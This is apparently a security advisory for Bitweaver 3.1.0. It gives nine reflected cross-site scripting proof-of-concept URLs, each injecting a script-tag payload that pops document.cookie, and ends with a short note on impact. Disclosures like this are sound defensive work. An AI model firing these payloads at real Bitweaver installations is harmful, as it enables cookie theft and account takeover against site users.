# Description

A cross-site scripting (XSS) issue in the Bitweaver  version 3.1.0 allows remote attackers to inject JavaScript via the multiple URI.
___
# XSS 1

**Vulnerable URI** - /users/admin/edit_group.php

**Steps to Reproduce Vulnerability:**

1- Login to Bitweaver Admin Panel

2- POC: https://localhost/bitweaver/users/admin/edit_group.php/'"--></style></scRipt><scRipt>alert(document.cookie)</scRipt>

**Screenshot:**

![POC](https://user-images.githubusercontent.com/69595454/111915623-e311b400-8a7f-11eb-94be-46cc6e98cde9.png)
___
___

# XSS 2

**Vulnerable URI** - /users/admin/index.php

**Steps to Reproduce Vulnerability:**

1- Login to Bitweaver Admin Panel

2- POC: https://localhost/bitweaver/users/admin/index.php/'"--></style></scRipt><scRipt>alert(document.cookie)</scRipt>

**Screenshot:**

![POC](https://user-images.githubusercontent.com/69595454/111915745-79de7080-8a80-11eb-9494-eb771bd5422d.png)

___
___
# XSS 3

**Vulnerable URI** - /users/admin/permissions.php

**Steps to Reproduce Vulnerability:**

1- Login to Bitweaver Admin Panel

2- POC: https://localhost/bitweaver/users/admin/permissions.php/'"--></style></scRipt><scRipt>alert(document.cookie)</scRipt>

**Screenshot:**

![POC](https://user-images.githubusercontent.com/69595454/111915932-4a7c3380-8a81-11eb-8a6f-65359ae081ba.png)

___
___

# XSS 4

**Vulnerable URI** - /users/admin/user_activity.php

**Steps to Reproduce Vulnerability:**

1- Login to Bitweaver Admin Panel

2- POC: https://localhost/bitweaver/users/admin/user_activity.php/'"--></style></scRipt><scRipt>alert(document.cookie)</scRipt>

**Screenshot:**

![POC](https://user-images.githubusercontent.com/69595454/111916022-bb235000-8a81-11eb-877d-4c4014cc121d.png)

___
___
# XSS 5

**Vulnerable URI** - /users/admin/users_import.php

**Steps to Reproduce Vulnerability:**

1- Login to Bitweaver Admin Panel

2- POC: https://localhost/bitweaver/users/admin/users_import.php/'"--></style></scRipt><scRipt>alert(document.cookie)</scRipt>

**Screenshot:**

![POC](https://user-images.githubusercontent.com/69595454/111916123-1bb28d00-8a82-11eb-9b89-d7a86339db59.png)

___
___
# XSS 6

**Vulnerable URI** - /users/edit_personal_page.php

**Steps to Reproduce Vulnerability:**

1- Login to Bitweaver Admin Panel

2- POC: https://localhost/bitweaver/users/edit_personal_page.php/'"--></style></scRipt><scRipt>alert(document.cookie)</scRipt>

**Screenshot:**

![POC](https://user-images.githubusercontent.com/69595454/111916256-adba9580-8a82-11eb-9786-ca5fcd94fe54.png)

___
___
# XSS 7

**Vulnerable URI** - /users/index.php

**Steps to Reproduce Vulnerability:**

1- Login to Bitweaver Admin Panel

2- POC: https://localhost/bitweaver/users/index.php/'"--></style></scRipt><scRipt>alert(document.cookie)</scRipt>

**Screenshot:**

![POC](https://user-images.githubusercontent.com/69595454/111916344-19046780-8a83-11eb-8161-90be8dca94ee.png)

___
___
# XSS 8

**Vulnerable URI** - /users/my_images.php

**Steps to Reproduce Vulnerability:**

1- Login to Bitweaver Admin Panel

2- POC: https://localhost/bitweaver/users/my_images.php/'"--></style></scRipt><scRipt>alert(document.cookie)</scRipt>

**Screenshot:**

![POC](https://user-images.githubusercontent.com/69595454/111916418-80bab280-8a83-11eb-9878-1ec080360f5d.png)
___
___
# XSS 9

**Vulnerable URI** - /users/preferences.php


**Steps to Reproduce Vulnerability:**

1- Login to Bitweaver Admin Panel

2- POC: https://localhost/bitweaver/users/preferences.php/'"--></style></scRipt><scRipt>alert(document.cookie)</scRipt>

**Screenshot:**

![POC](https://user-images.githubusercontent.com/69595454/111916481-cd05f280-8a83-11eb-8895-ac98f4d23c7c.png)
___
___
# Impact

With the help of xss attacker can perform social engineering on users by redirecting them from real website to fake one. Attacker can steal their cookies leading to account takeover and download a malware on their system, and there are many more attacking scenarios a skilled attacker can perform with xss.
